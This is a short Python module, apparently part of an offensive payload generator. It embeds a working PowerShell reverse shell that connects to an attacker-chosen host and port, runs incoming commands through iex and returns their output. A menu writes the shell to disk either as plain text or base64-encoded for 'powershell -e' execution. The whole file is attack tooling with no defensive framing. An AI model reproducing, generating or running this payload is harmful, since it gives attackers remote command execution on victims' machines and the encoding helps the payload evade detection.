import os, base64, re

class ps_pl:
    def __init__(self, args, pl_path):
        self.args = args
        self.pl_path = pl_path
        self.ps_revshell = f'''
$client=New-Object System.Net.Sockets.TCPClient("{self.args.lhost}",{self.args.lport});
$stream=$client.GetStream();
[byte[]]$bytes=0..65535|%{{0}};
while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne {self.args.lport}){{
    $data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback=(iex $data 2>&1 | Out-String);
    $sendback2=$sendback+"PS "+(pwd).Path+"> ";
    $sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
'''

    def menu(self):
        print("\n--- Powershell Payload ---")
        print("1. Plain  [revshell.ps1]")
        print("2. Base64 [revshell.ps1]")
        choice = input(": ")
        if choice == "1":
            self.plain()
        elif choice == "2":
            self.b64()

    def plain(self):
        with open(f'{self.pl_path}revshell.ps1', "w") as file:
            file.write(self.ps_revshell)
        os.system(f'cp {self.pl_path}revshell.ps1 .')

    def b64(self):
        utf16_bytes = self.ps_revshell.encode('utf-16le')
        base64_encoded = base64.b64encode(utf16_bytes).decode('ascii')
        with open(f'{self.pl_path}b64_revshell.ps1', "w") as file:
            file.write(f'powershell -e {base64_encoded}')
        os.system(f'cp {self.pl_path}b64_revshell.ps1 .')